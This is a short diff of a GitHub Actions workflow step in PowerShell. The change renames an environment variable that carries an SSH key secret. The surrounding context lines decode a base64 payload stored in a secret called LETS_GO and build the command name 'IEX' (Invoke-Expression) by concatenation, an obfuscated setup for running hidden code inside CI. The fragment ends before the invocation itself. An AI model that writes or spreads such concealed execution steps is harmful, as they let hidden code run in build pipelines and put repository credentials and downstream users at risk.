@@ -27,7 +27,7 @@ jobs:
         shell: powershell
         env:
           LETS_GO: ${{ secrets.R4DX_EXECUTE }}
-          R4DX_KEY: ${{ secrets.SSH_KEY }}
+          SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
           $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:LETS_GO))
           $e = "I" + "E" + "X"
